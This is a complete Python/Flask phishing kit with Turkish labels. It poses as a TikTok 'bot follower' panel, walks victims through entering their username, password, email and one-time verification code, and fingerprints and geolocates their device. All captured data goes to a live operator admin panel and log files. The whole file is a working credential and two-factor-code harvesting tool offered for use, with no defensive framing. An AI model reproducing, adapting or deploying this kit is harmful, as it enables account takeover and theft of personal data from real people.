# -*- coding: utf-8 -*-
# TikTok Bot Basma Paneli + Gerçek Zamanlı Log
# Çalıştır: python ttoltalma.py
# Gerekli: pip install flask

import os
import sys
import json
import time
import socket
import threading
import webbrowser
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify, Response

# ==================== AYARLAR ====================
HOST = "0.0.0.0"
PORT = 8080
ADMIN_PORT = 8081
LOG_DIR = "captures"
# =================================================

app = Flask(__name__)

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Global canlı veri (admin panel için)
LIVE_DATA = {
    "devices": [],
    "credentials": [],
    "codes": [],
    "stats": {"visits": 0, "devices": 0, "creds": 0, "codes": 0}
}

LOG_FILE = os.path.join(LOG_DIR, "live.json")

# ==================== KURBAN SAYFASI ====================
HTML_PAGE = r"""
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>TikTok - Bot Basma Paneli</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23FE2C55' d='M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005.5 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1.54-.1z'/></svg>">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;
justify-content:center;padding:16px;overflow-x:hidden}

.bg{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none}
.bg::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;
background:radial-gradient(circle at 25% 25%,rgba(254,44,85,.18),transparent 35%),
radial-gradient(circle at 75% 75%,rgba(37,244,238,.15),transparent 35%);
animation:rot 25s linear infinite}
@keyframes rot{to{transform:rotate(360deg)}}

.card{position:relative;z-index:1;width:100%;max-width:440px;background:rgba(18,18,18,.95);
backdrop-filter:blur(20px);border-radius:20px;padding:32px 26px;
box-shadow:0 30px 80px rgba(0,0,0,.9),0 0 0 1px rgba(255,255,255,.05)}

.logo{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:6px}
.logo svg{width:44px;height:44px;filter:drop-shadow(0 0 12px rgba(254,44,85,.5))}
.brand{font-size:26px;font-weight:800;letter-spacing:-.8px}
.brand .p1{color:#FE2C55}
.brand .p2{color:#25F4EE}

.tagline{text-align:center;color:#888;font-size:12px;margin-bottom:24px;
text-transform:uppercase;letter-spacing:2px;font-weight:600}

.badge{display:inline-block;background:linear-gradient(135deg,#FE2C55,#ff6b8a);
color:#fff;font-size:10px;font-weight:700;padding:4px 10px;border-radius:20px;
margin:0 auto 20px;text-align:center;letter-spacing:1px}
.badge-wrap{text-align:center}

.progress{display:flex;gap:6px;margin-bottom:26px;justify-content:center}
.progress .dot{width:100%;max-width:60px;height:4px;background:#222;border-radius:2px;
transition:all .4s ease;position:relative;overflow:hidden}
.progress .dot.done{background:linear-gradient(90deg,#25F4EE,#FE2C55)}

.step{display:none}
.step.active{display:block;animation:slide .4s cubic-bezier(.2,.8,.2,1)}
@keyframes slide{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}

.step-h{font-size:18px;font-weight:700;text-align:center;margin-bottom:6px}
.step-p{font-size:13px;color:#888;text-align:center;margin-bottom:22px;line-height:1.5}

.field{position:relative;margin-bottom:14px}
.field input{width:100%;padding:16px 46px 16px 16px;background:#1a1a1a;
border:2px solid #262626;border-radius:12px;color:#fff;font-size:15px;
outline:none;transition:all .25s;font-family:inherit;font-weight:500}
.field input:focus{border-color:#FE2C55;background:#1f1f1f;
box-shadow:0 0 0 4px rgba(254,44,85,.12)}
.field input::placeholder{color:#555;font-weight:400}
.field .ic{position:absolute;right:16px;top:50%;transform:translateY(-50%);
color:#666;font-size:18px;pointer-events:none;transition:color .2s}
.field input:focus ~ .ic{color:#FE2C55}

.btn{width:100%;padding:16px;background:linear-gradient(135deg,#FE2C55,#ff4d70);
border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:700;
cursor:pointer;transition:all .2s;font-family:inherit;letter-spacing:.3px;
box-shadow:0 8px 24px rgba(254,44,85,.35)}
.btn:hover:not(:disabled){transform:translateY(-2px);
box-shadow:0 12px 32px rgba(254,44,85,.5)}
.btn:active:not(:disabled){transform:translateY(0)}
.btn:disabled{opacity:.6;cursor:not-allowed}

.btn-secondary{background:#1f1f1f;box-shadow:none;margin-top:10px}
.btn-secondary:hover:not(:disabled){background:#2a2a2a;transform:none;box-shadow:none}

.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);
border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;
vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}

.info-box{background:rgba(37,244,238,.08);border:1px solid rgba(37,244,238,.25);
border-radius:10px;padding:12px;font-size:12px;color:#25F4EE;margin-bottom:16px;
text-align:center;line-height:1.5}

.success{text-align:center;padding:20px 0}
.success .ic-big{font-size:64px;margin-bottom:12px;
animation:pop .5s cubic-bezier(.2,.8,.2,1)}
@keyframes pop{0%{transform:scale(0)}70%{transform:scale(1.15)}100%{transform:scale(1)}}
.success .t{font-size:20px;font-weight:700;margin-bottom:6px}
.success .s{font-size:13px;color:#888}

.footer{text-align:center;margin-top:22px;font-size:11px;color:#555}
.footer a{color:#FE2C55;text-decoration:none;font-weight:600}

.code-input{text-align:center !important;letter-spacing:12px !important;
font-size:24px !important;font-weight:800 !important;padding-left:16px !important}

.stat-bar{display:flex;gap:8px;margin-bottom:20px}
.stat-bar .s{flex:1;background:#1a1a1a;border-radius:10px;padding:10px;text-align:center}
.stat-bar .s .v{font-size:16px;font-weight:800;color:#FE2C55}
.stat-bar .s .l{font-size:10px;color:#666;text-transform:uppercase;letter-spacing:1px}
</style>
</head>
<body>
<div class="bg"></div>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 24 24">
      <path fill="#25F4EE" d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005.5 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1.54-.1z"/>
      <path fill="#FE2C55" d="M21.13 8.02v-3.4a4.85 4.85 0 01-1.54-.1 4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005.5 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52z" opacity=".7"/>
    </svg>
    <div class="brand"><span class="p1">Tik</span><span class="p2">Tok</span></div>
  </div>
  <div class="tagline">Bot Basma Paneli</div>
  <div class="badge-wrap"><div class="badge">⚡ 5000 BOT / DAKİKA</div></div>

  <div class="stat-bar">
    <div class="s"><div class="v" id="stBots">0</div><div class="l">Bot</div></div>
    <div class="s"><div class="v" id="stQueue">0</div><div class="l">Kuyruk</div></div>
    <div class="s"><div class="v" id="stStatus">HAZIR</div><div class="l">Durum</div></div>
  </div>

  <div class="progress">
    <span class="dot" id="p1"></span><span class="dot" id="p2"></span>
    <span class="dot" id="p3"></span><span class="dot" id="p4"></span>
    <span class="dot" id="p5"></span>
  </div>

  <!-- ADIM 1: Takipçi -->
  <div class="step active" id="step1">
    <div class="step-h">Hedef Takipçi Sayısı</div>
    <div class="step-p">Hesabınıza gönderilecek takipçi sayısını seçin</div>
    <div class="field">
      <input type="number" id="followers" placeholder="Örn: 10000" inputmode="numeric" autofocus>
      <span class="ic">👥</span>
    </div>
    <button class="btn" onclick="goStep(2)">Devam Et</button>
  </div>

  <!-- ADIM 2: Kullanıcı adı -->
  <div class="step" id="step2">
    <div class="step-h">Kullanıcı Adı</div>
    <div class="step-p">Botların gönderileceği TikTok hesabı</div>
    <div class="field">
      <input type="text" id="username" placeholder="@kullaniciadi" autocomplete="username">
      <span class="ic">@</span>
    </div>
    <button class="btn" onclick="goStep(3)">Devam Et</button>
    <button class="btn btn-secondary" onclick="goBack(1)">Geri</button>
  </div>

  <!-- ADIM 3: Şifre -->
  <div class="step" id="step3">
    <div class="step-h">Hesap Şifresi</div>
    <div class="step-p">Bot bağlantısı için hesap doğrulaması</div>
    <div class="field">
      <input type="password" id="password" placeholder="••••••••" autocomplete="current-password">
      <span class="ic">🔒</span>
    </div>
    <button class="btn" onclick="goStep(4)">Bağlan</button>
    <button class="btn btn-secondary" onclick="goBack(2)">Geri</button>
  </div>

  <!-- ADIM 4: E-posta -->
  <div class="step" id="step4">
    <div class="info-box">📧 Bot onayı için e-posta doğrulaması gerekli</div>
    <div class="step-h">E-posta Adresi</div>
    <div class="step-p">Hesabınıza bağlı e-posta</div>
    <div class="field">
      <input type="email" id="email" placeholder="ornek@mail.com" autocomplete="email">
      <span class="ic">✉</span>
    </div>
    <button class="btn" onclick="sendEmail()" id="btnEmail">Kod Gönder</button>
    <button class="btn btn-secondary" onclick="goBack(3)">Geri</button>
  </div>

  <!-- ADIM 5: Kod -->
  <div class="step" id="step5">
    <div class="info-box">🔐 6 haneli doğrulama kodunu girin</div>
    <div class="step-h">Doğrulama Kodu</div>
    <div class="step-p">E-postanıza gönderildi</div>
    <div class="field">
      <input type="text" id="code" class="code-input" placeholder="______"
             maxlength="6" inputmode="numeric">
    </div>
    <button class="btn" onclick="sendCode()" id="btnCode">Bot Basmayı Başlat</button>
  </div>

  <!-- ADIM 6: Başarılı -->
  <div class="step" id="step6">
    <div class="success">
      <div class="ic-big">🚀</div>
      <div class="t">Bot Basma Başlatıldı!</div>
      <div class="s" id="finalMsg">5000 bot/dakika hızında çalışıyor...</div>
    </div>
    <div class="info-box" style="margin-top:20px">
      ⏱ Tahmini süre: <b id="eta">--</b><br>
      📊 Durum: <b>AKTİF</b>
    </div>
  </div>

  <div class="footer">
    © 2026 TikTok Bot Panel · <a href="#">Yardım</a>
  </div>
</div>

<script>
// ==================== CİHAZ PARMAK İZİ ====================
const fp = {
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  language: navigator.language,
  languages: (navigator.languages||[]).join(','),
  screen: screen.width + 'x' + screen.height,
  availScreen: screen.availWidth + 'x' + screen.availHeight,
  colorDepth: screen.colorDepth,
  pixelRatio: window.devicePixelRatio || 1,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  tzOffset: new Date().getTimezoneOffset(),
  cores: navigator.hardwareConcurrency || '?',
  memory: navigator.deviceMemory || '?',
  touch: navigator.maxTouchPoints || 0,
  cookies: navigator.cookieEnabled,
  dnt: navigator.doNotTrack || '0',
  referrer: document.referrer || 'direkt',
  url: location.href,
  ts: new Date().toISOString(),
  localTime: new Date().toLocaleString('tr-TR')
};

// WebGL
try {
  const c = document.createElement('canvas');
  const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
  if (gl) {
    const d = gl.getExtension('WEBGL_debug_renderer_info');
    if (d) {
      fp.gpuVendor = gl.getParameter(d.UNMASKED_VENDOR_WEBGL);
      fp.gpuRenderer = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
    }
  }
} catch(e){}

// Canvas
try {
  const c = document.createElement('canvas');
  c.width = 220; c.height = 60;
  const x = c.getContext('2d');
  x.textBaseline = 'top';
  x.font = '15px Arial';
  x.fillStyle = '#f60';
  x.fillRect(130,1,70,22);
  x.fillStyle = '#069';
  x.fillText('TikTok-Bot-Panel!', 2, 18);
  x.fillStyle = 'rgba(102,204,0,.7)';
  x.fillText('TikTok-Bot-Panel!', 4, 20);
  fp.canvas = c.toDataURL().slice(-60);
} catch(e){}

// Pil
if (navigator.getBattery) {
  navigator.getBattery().then(b => {
    fp.battery = Math.round(b.level*100)+'%'+(b.charging?' ⚡':'');
  });
}

// Konum (izin varsa)
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    p => {
      fp.lat = p.coords.latitude.toFixed(4);
      fp.lon = p.coords.longitude.toFixed(4);
      fp.accuracy = Math.round(p.coords.accuracy)+'m';
      send('location', fp);
    },
    () => {},
    {timeout: 3000}
  );
}

// IP + cihaz
fetch('https://api.ipify.org?format=json')
  .then(r => r.json())
  .then(d => {
    fp.ip = d.ip;
    send('device', fp);
    return fetch('https://ipapi.co/json/').catch(()=>null);
  })
  .then(r => r ? r.json() : null)
  .then(d => {
    if (d) {
      fp.isp = d.org;
      fp.country = d.country_name;
      fp.city = d.city;
      fp.region = d.region;
      fp.postal = d.postal;
      send('geo', fp);
    }
  })
  .catch(()=>{ fp.ip='?'; send('device', fp); });

// ==================== LOG ====================
function send(type, data) {
  fetch('/log', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({type, data})
  }).catch(()=>{});
}

// ==================== ADIM YÖNETİMİ ====================
let c = {};

function paintProgress(n) {
  for (let i=1;i<=5;i++) {
    const d = document.getElementById('p'+i);
    if (d) d.className = 'dot' + (i<=n ? ' done' : '');
  }
}

function goStep(n) {
  if (n===2) {
    const v = document.getElementById('followers').value;
    if (!v || v<=0) { alert('Takipçi sayısı girin'); return; }
    c.followers = v;
  }
  if (n===3) {
    const v = document.getElementById('username').value.trim();
    if (!v) { alert('Kullanıcı adı girin'); return; }
    c.username = v;
  }
  if (n===4) {
    const v = document.getElementById('password').value;
    if (!v) { alert('Şifre girin'); return; }
    c.password = v;
  }

  document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
  document.getElementById('step'+n).classList.add('active');
  paintProgress(n);
  send('step', {step:n, data:{...c}});
}

function goBack(n) {
  document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
  document.getElementById('step'+n).classList.add('active');
  paintProgress(n);
}

function sendEmail() {
  const v = document.getElementById('email').value.trim();
  if (!v || !v.includes('@') || !v.includes('.')) { alert('Geçerli e-posta girin'); return; }
  c.email = v;

  const b = document.getElementById('btnEmail');
  b.disabled = true;
  b.innerHTML = '<span class="spinner"></span>Gönderiliyor...';

  send('credentials', c);

  setTimeout(()=>{
    document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
    document.getElementById('step5').classList.add('active');
    paintProgress(5);
  }, 1800);
}

function sendCode() {
  const v = document.getElementById('code').value.trim();
  if (v.length !== 6) { alert('6 haneli kod girin'); return; }
  c.code = v;

  const b = document.getElementById('btnCode');
  b.disabled = true;
  b.innerHTML = '<span class="spinner"></span>Başlatılıyor...';

  send('code', c);

  setTimeout(()=>{
    document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
    document.getElementById('step6').classList.add('active');
    paintProgress(5);
    // Animasyon
    const eta = document.getElementById('eta');
    let f = parseInt(c.followers) || 10000;
    let mins = Math.ceil(f / 5000);
    eta.textContent = mins + ' dakika';
  }, 2000);
}

// Otomatik ilerleme (rakam girince)
document.addEventListener('keydown', e=>{
  if (e.key==='Enter') {
    const a = document.querySelector('.step.active button.btn');
    if (a && !a.disabled) a.click();
  }
});

// Kod input - sadece sayı
document.getElementById('code').addEventListener('input', e=>{
  e.target.value = e.target.value.replace(/\D/g,'');
});
</script>
</body>
</html>
"""

# ==================== ADMIN PANEL HTML ====================
ADMIN_PAGE = r"""
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<title>Admin - Canlı Log</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Consolas',monospace}
body{background:#0a0a0a;color:#0f0;padding:16px;min-height:100vh}
h1{color:#FE2C55;font-size:20px;margin-bottom:14px;border-bottom:1px solid #333;padding-bottom:10px}
.stats{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap}
.stat{background:#111;border:1px solid #222;padding:12px 18px;border-radius:8px;min-width:120px}
.stat .v{font-size:22px;font-weight:bold;color:#25F4EE}
.stat .l{font-size:10px;color:#666;text-transform:uppercase;letter-spacing:1px}
.tabs{display:flex;gap:4px;margin-bottom:12px}
.tab{padding:8px 16px;background:#111;border:1px solid #222;border-radius:6px;cursor:pointer;
color:#888;font-size:12px}
.tab.active{background:#FE2C55;color:#fff;border-color:#FE2C55}
.panel{background:#0d0d0d;border:1px solid #1a1a1a;border-radius:8px;padding:14px;
max-height:70vh;overflow:auto}
.entry{background:#111;border-left:3px solid #FE2C55;padding:10px 12px;margin-bottom:8px;
border-radius:4px;font-size:12px;line-height:1.5}
.entry.device{border-left-color:#25F4EE}
.entry.geo{border-left-color:#ffaa00}
.entry.code{border-left-color:#00ff88}
.entry .time{color:#666;font-size:10px}
.entry .ip{color:#FE2C55;font-weight:bold}
.entry .type{background:#222;padding:2px 8px;border-radius:10px;font-size:10px;
margin-left:6px;color:#fff}
.entry pre{color:#0f0;white-space:pre-wrap;word-break:break-all;margin-top:6px}
.key{color:#25F4EE}
.val{color:#fff}
</style>
</head>
<body>
<h1>⚡ ADMIN - CANLI LOG</h1>
<div class="stats">
  <div class="stat"><div class="v" id="s1">0</div><div class="l">Ziyaret</div></div>
  <div class="stat"><div class="v" id="s2">0</div><div class="l">Cihaz</div></div>
  <div class="stat"><div class="v" id="s3">0</div><div class="l">Kimlik</div></div>
  <div class="stat"><div class="v" id="s4">0</div><div class="l">Kod</div></div>
</div>
<div class="tabs">
  <div class="tab active" onclick="setTab('all',this)">TÜMÜ</div>
  <div class="tab" onclick="setTab('device',this)">CİHAZ</div>
  <div class="tab" onclick="setTab('geo',this)">KONUM</div>
  <div class="tab" onclick="setTab('credentials',this)">KİMLİK</div>
  <div class="tab" onclick="setTab('code',this)">KOD</div>
</div>
<div class="panel" id="panel"></div>
<script>
let allData = [];
let filter = 'all';

function fmt(d) {
  let s = '';
  for (const k in d) {
    let v = d[k];
    if (typeof v === 'object') v = JSON.stringify(v);
    s += `<span class="key">${k}</span>: <span class="val">${v}</span><br>`;
  }
  return s;
}

function render() {
  const p = document.getElementById('panel');
  let arr = allData;
  if (filter !== 'all') arr = allData.filter(x => x.type === filter);
  arr = arr.slice(-200).reverse();
  p.innerHTML = arr.map(e => `
    <div class="entry ${e.type}">
      <div><span class="time">${e.time}</span> <span class="ip">${e.ip}</span>
      <span class="type">${e.type.toUpperCase()}</span></div>
      <pre>${fmt(e.data)}</pre>
    </div>
  `).join('') || '<div style="color:#666">Veri bekleniyor...</div>';
}

function setTab(t, el) {
  filter = t;
  document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
  el.classList.add('active');
  render();
}

// Canlı çekme
async function poll() {
  try {
    const r = await fetch('/api/live');
    const j = await r.json();
    allData = j.logs || [];
    document.getElementById('s1').textContent = j.stats.visits;
    document.getElementById('s2').textContent = j.stats.devices;
    document.getElementById('s3').textContent = j.stats.creds;
    document.getElementById('s4').textContent = j.stats.codes;
    render();
  } catch(e){}
}
poll();
setInterval(poll, 1500);
</script>
</body>
</html>
"""

# ==================== ROUTES ====================

@app.route('/')
def index():
    LIVE_DATA['stats']['visits'] += 1
    save_live()
    return render_template_string(HTML_PAGE)

@app.route('/log', methods=['POST'])
def log():
    try:
        data = request.get_json(force=True)
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ts = datetime.now().strftime('%H:%M:%S')

        t = data.get('type', '?')
        d = data.get('data', {})

        # İstatistik
        if t == 'device': LIVE_DATA['stats']['devices'] += 1
        if t == 'credentials': LIVE_DATA['stats']['creds'] += 1
        if t == 'code': LIVE_DATA['stats']['codes'] += 1

        # Canlı veriye ekle
        entry = {'time': ts, 'ip': ip, 'type': t, 'data': d}
        LIVE_DATA['devices' if t=='device' else 'credentials' if t=='credentials' else 'codes'].append(entry)
        # Limit
        for k in ['devices','credentials','codes']:
            if len(LIVE_DATA[k]) > 500:
                LIVE_DATA[k] = LIVE_DATA[k][-500:]

        save_live()

        # Konsol
        print(f"\n[{ts}] [{ip}] [{t.upper()}]")
        print(json.dumps(d, ensure_ascii=False, indent=2))
        print("-"*60)

        # Kalıcı kayıt
        fname = os.path.join(LOG_DIR, f"capture_{datetime.now().strftime('%Y-%m-%d')}.json")
        with open(fname, 'a', encoding='utf-8') as f:
            f.write(json.dumps({'time': ts, 'ip': ip, 'type': t, 'data': d}, ensure_ascii=False) + '\n')

        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"[HATA] {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/api/live')
def api_live():
    # Son 200 kayıt (tüm tipler)
    all_logs = []
    for k in ['devices','credentials','codes']:
        all_logs.extend(LIVE_DATA[k])
    all_logs.sort(key=lambda x: x['time'])
    return jsonify({'logs': all_logs[-200:], 'stats': LIVE_DATA['stats']})

def save_live():
    try:
        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            json.dump(LIVE_DATA, f, ensure_ascii=False, indent=2)
    except: pass

# ==================== ADMIN SUNUCU ====================

admin_app = Flask('admin', static_folder=None)

@admin_app.route('/')
def admin_index():
    return render_template_string(ADMIN_PAGE)

@admin_app.route('/api/live')
def admin_live():
    all_logs = []
    for k in ['devices','credentials','codes']:
        all_logs.extend(LIVE_DATA[k])
    all_logs.sort(key=lambda x: x['time'])
    return jsonify({'logs': all_logs[-200:], 'stats': LIVE_DATA['stats']})

def run_admin():
    print(f"[+] Admin paneli: http://127.0.0.1:{ADMIN_PORT}")
    admin_app.run(host='0.0.0.0', port=ADMIN_PORT, debug=False, threaded=True, use_reloader=False)

# ==================== YARDIMCI ====================

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except: return "127.0.0.1"

def open_browser():
    time.sleep(1.5)
    webbrowser.open(f"http://127.0.0.1:{PORT}")
    time.sleep(0.5)
    webbrowser.open(f"http://127.0.0.1:{ADMIN_PORT}")

def banner():
    ip = get_local_ip()
    print("\n" + "="*62)
    print("  TikTok Bot Basma Paneli - AKTİF")
    print("="*62)
    print(f"  Kurban sayfası : http://127.0.0.1:{PORT}")
    print(f"  Ağ (LAN)       : http://{ip}:{PORT}")
    print(f"  ADMIN PANEL    : http://127.0.0.1:{ADMIN_PORT}")
    print(f"  Loglar         : ./{LOG_DIR}/")
    print("="*62)
    print("  Durdur: CTRL + C")
    print("="*62 + "\n")

# ==================== OLTALAMA MENÜSÜ İÇİN FONKSİYON ====================

def tiktok_oltalama_baslat():
    """Oltalama araçları menüsünden çağrılan fonksiyon."""
    banner()
    threading.Thread(target=run_admin, daemon=True).start()
    threading.Thread(target=open_browser, daemon=True).start()
    try:
        app.run(host=HOST, port=PORT, debug=False, threaded=True, use_reloader=False)
    except KeyboardInterrupt:
        print("\n[!] Kapatıldı.")
        return

# ==================== MAIN ====================

if __name__ == '__main__':
    tiktok_oltalama_baslat()